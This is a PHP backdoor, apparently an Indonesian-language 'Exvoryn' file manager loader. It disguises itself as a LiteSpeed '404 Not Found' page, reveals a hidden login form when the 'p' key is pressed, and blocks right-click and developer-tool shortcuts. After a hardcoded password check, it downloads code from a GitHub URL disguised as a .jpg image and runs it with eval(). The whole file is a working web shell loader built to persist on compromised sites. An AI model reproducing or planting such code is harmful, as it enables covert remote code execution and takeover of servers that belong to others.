<?php
session_start();

// ================== KONFIGURASI ==================
$username    = "AnakBawang10";
$passwordHash = '$2y$12$4JMp9E/np/2k8t.eodqdDewZfI8h8iCMyQAdCnIFUW0oBD4LTE2hO'; // bcrypt hash

// URL file yang akan dieksekusi setelah login
$file_url = 'https://raw.githubusercontent.com/Exvoryn/file-manager/refs/heads/main/Exvoryn/2025/403.jpg';

// ================== LOGIC LOGIN ==================
if (!isset($_SESSION['loggedin'])) {

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username'], $_POST['password'])) {
        
        if ($_POST['username'] === $username && password_verify($_POST['password'], $passwordHash)) {
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error = "Authentication failed: Invalid credentials";
        }
    }

    // ================== TAMPILAN LOGIN (Fake 403) ==================
    ?>
    <!DOCTYPE html>
    <html lang="id" style="height:100%">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>404 Not Found</title>
        <style>
            @media (prefers-color-scheme:dark) { body { background-color:#000!important; } }
            body {
                margin: 0;
                font: 14px/20px Arial, Helvetica, sans-serif;
                height: 100%;
                background-color: #fff;
                color: #444;
                overflow: hidden;
            }
            .container { min-height: 100%; position: relative; }
            .error-box {
                text-align: center;
                width: 800px;
                margin-left: -400px;
                position: absolute;
                top: 30%;
                left: 50%;
            }
            .footer {
                color: #f0f0f0;
                font-size: 12px;
                padding: 15px 30px;
                position: fixed;
                bottom: 0;
                left: 0;
                background-color: #474747;
                width: 100%;
                text-align: left;
            }

            /* Password Container */
            .password-container {
                display: none;
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: rgba(0, 17, 20, 0.95);
                border: 1px solid #1282c1;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 0 25px #1282c1, 0 0 40px #008299 inset;
                width: 320px;
                color: #1282c1;
                text-align: center;
                z-index: 9999;
            }
            .password-container h3 {
                margin: 0 0 20px 0;
                text-shadow: 0 0 10px #1282c1;
                letter-spacing: 2px;
            }
            .password-container input,
            .password-container button {
                width: 100%;
                padding: 12px;
                margin: 8px 0;
                box-sizing: border-box;
                border: 1px solid #1282c1;
                background: #000;
                color: #1282c1;
            }
            .password-container button {
                cursor: pointer;
                font-weight: bold;
                text-transform: uppercase;
                transition: 0.3s;
            }
            .password-container button:hover {
                background: #1282c1;
                color: black;
                box-shadow: 0 0 15px #1282c1;
            }
            .error { color: #66e0ff; margin-top: 10px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="error-box">
                <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>
                <h2 style="margin-top:20px; font-size:30px;">Not Found</h2>
                <p>Access to this resource on the server is denied!</p>
            </div>
        </div>

        <div class="footer">
            <br>Proudly powered by LiteSpeed Web Server<br>
            <small>LiteSpeed Technologies Inc. is not a web hosting company and has no control over content found on this site.</small>
        </div>

        <!-- Password Form -->
        <div id="password-form" class="password-container">
            <h3>WELLCOME EXVORYN MANAGER</h3>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">MASUKIN LAGI</button>
            </form>
            <?php if (isset($error)) echo "<p class='error'>$error</p>"; ?>
        </div>

        <script>
            // 
            document.addEventListener("keydown", function (e) {
                if (e.key.toLowerCase() === "p") {
                    document.getElementById("password-form").style.display = "block";
                }
            });

            // Anti inspect & right click
            document.addEventListener("contextmenu", e => e.preventDefault());
            document.addEventListener("keydown", function (e) {
                if (e.ctrlKey && (e.key === "u" || e.key === "U" || (e.shiftKey && (e.key === "I" || e.key === "C"))) || e.key === "F12") {
                    e.preventDefault();
                }
            });
        </script>
    </body>
    </html>
    <?php
    exit();
}

// ================== LOGIN BERHASIL -> JALANKAN FILE ==================
if (isset($_SESSION['loggedin'])) {
    $content = @file_get_contents($file_url);
    
    if ($content !== false) {
        eval('?>' . $content);
    } else {
        die("Gagal mengambil file dari server.");
    }
    exit();
}
?>
